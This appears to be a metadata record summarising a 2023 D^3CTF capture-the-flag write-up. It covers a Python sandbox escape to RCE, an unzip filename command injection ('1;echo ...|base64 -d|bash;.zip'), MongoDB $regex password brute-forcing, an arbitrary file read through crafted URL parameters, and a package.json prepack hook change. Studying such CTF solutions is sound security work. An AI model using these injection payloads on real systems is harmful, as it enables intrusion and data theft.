...
- XOR-ring
attack_chain:
- 'WEB Escape Plan: list(dict(...))[] 切片拿 ''_'' 字符 + base64 payload, RCE 拿 flag'
- 'd3cloud: admin/admin → FilesystemAdapter putFileAs → 上传 zip 自动 unzip → 文件名命令注入: 1;echo Y2F0...|base64 -d|bash;.zip'
- 'd3node: MongoDB NoSQL regex 注入 password[$regex]=''^xxx'' 逐字符爆破'
- PackDependencies 改 package.json prepack 命令 → 触发 npm pack
- 'filename[href]=[a] filename[origin]=[1] filename[protocol]=file: ... 任意文件读绕过'
- 'REVERSE d3sky: 浮点除零异常反调试, attach 绕过, input XOR ring 还原'
...
quality: high
full_path: 2023_D^3CTF_writeup_by_万年三等奖.full.md
meta_path: 2023_D^3CTF_writeup_by_万年三等奖.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2023 D^3CTF writeup by 万年三等奖。2023 D^3CTF：Python list(dict()) 沙箱逃逸 + FilesystemAdapter zip 命令注入 + d3sky XOR ring。关键路径：WEB Escape Plan: list(dict(...))[] 切片拿 ''_'' 字符 + base64 payload, RCE 拿 flag → d3c...'
category: web
subcategory: rce
subcategories:
- rce
...
contest_type: open
wp_url: https://www.ctfiot.com/113179.html
wp_author: 万年三等奖
reasoning_chain:
- 'Q1 Escape Plan: Python sandbox → list(dict()) 拿空字符串 → 触发点：内置对象路径走通'
- 假设：ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])]...))) → 动作：构造下划线属性链
- 观察：eval 内置函数注入 → payload base64 → __import__('os').popen → RCE
- 'Q2 d3cloud: FilesystemAdapter.php putFileAs zip 自动解压 → 触发点：unzip 命令注入'
- 假设：unzip -oq {path}/{name} -d {path} 中 filename 可控 → 动作：filename='1;echo Y2F0...|base64 -d|bash;.zip'
- 观察：写入 /var/www/html/public/flag.txt
- 'Q3 d3node: MongoDB password[$regex] 注入 → 假设：NoSQL regex 字符级爆破'
- 动作：循环 string.printable 字符爆破 → 观察：admin 密码
- 'Q4 hint2 任意文件读: filename[href]=a&filename[origin]=1&filename[protocol]=file:&filename[hostname]=&filename[pathname]=./%2561pp.js'
- 假设：pathname 二次编码绕过 → 动作：%2561 = 'a' → 观察：读 app.js
- 'Q5 d3sky XOR ring: 异或环形结构 → 假设：建立线性方程组逆推 key'
- 动作：sage 解 GF(2) → 观察：flag
failed_attempts:
- 试图用 Python builtins.open → 失败：sandbox 拦截
- 试图用 zip-slip 写文件 → 失败：unzip 命令注入更直接
- 试图用 $where 注入 → 失败：MongoDB 6+ 已禁
key_observations:
- Python list(dict()) 取空字符串是经典沙箱逃逸
- zip 自动解压是 RCE 经典（filename 命令注入）
- MongoDB password[$regex] 是 NoSQL 注入字符爆破
- XOR ring 方程组是 reverse 入门
prerequisites:
- Python 沙箱逃逸（list(dict()) + 内置对象链）
- unzip 命令注入
- MongoDB NoSQL 注入
- Sage / Z3 解线性方程组
---
